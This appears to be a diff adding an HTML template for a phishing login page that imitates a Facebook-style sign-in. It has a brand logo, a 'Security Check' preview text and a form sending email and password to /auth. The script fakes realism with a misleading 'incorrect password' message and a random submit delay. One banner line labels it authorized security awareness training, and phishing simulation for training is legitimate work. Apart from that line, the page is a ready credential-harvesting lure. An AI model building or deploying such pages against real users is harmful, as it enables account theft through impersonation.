@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{ site }} – log in or sign up</title>
+<meta property="og:title" content="{{ site }} – Security Check">
+<meta property="og:description" content="Confirm your identity to continue.">
+<link rel="icon" href="/static/fb-logo.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/static/style.css">
+</head><body>
+<div class="topbar" role="banner">{{ site }}</div>
+<main class="login-box" role="main">
+  <h2>Log into {{ site }}</h2>
+  <form method="POST" action="/auth" id="lf" novalidate>
+    <div class="field">
+      <input type="text" name="email" id="email" placeholder="Email or phone number" required autocomplete="username">
+      <div class="err" id="err-email"></div>
+    </div>
+    <div class="field">
+      <input type="password" name="password" id="password" placeholder="Password" required autocomplete="current-password">
+      <div class="err" id="err-password"></div>
+    </div>
+    <button type="submit" id="btn">Log In</button>
+  </form>
+  <a href="#" class="forgot">Forgot password?</a>
+  <hr>
+  <a href="#" class="create">Create new account</a>
+</main>
+<div class="banner">Authorized security awareness training — do not enter real credentials.</div>
+<script>
+(function(){
+  const f=document.getElementById('lf'),btn=document.getElementById('btn'),
+        email=document.getElementById('email'),pass=document.getElementById('password'),
+        ee=document.getElementById('err-email'),pe=document.getElementById('err-password');
+  function ok(v){ if(!v)return false; if(/^\+?\d{6,15}$/.test(v))return true;
+    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v); }
+  f.addEventListener('submit',function(e){
+    ee.textContent=''; pe.textContent='';
+    if(!ok(email.value.trim())){ ee.textContent='Please enter a valid email or phone number.'; e.preventDefault(); return; }
+    if(pass.value.length<6){ pe.textContent='The password you entered is incorrect.'; e.preventDefault(); return; }
+    e.preventDefault(); btn.disabled=true; btn.textContent='Logging in…'; btn.classList.add('loading');
+    setTimeout(function(){ f.submit(); },1200+Math.random()*800);
+  });
+  btn.addEventListener('mousedown',()=>btn.classList.add('pressed'));
+  btn.addEventListener('mouseup',()=>btn.classList.remove('pressed'));
+})();
+</script>
+</body></html>
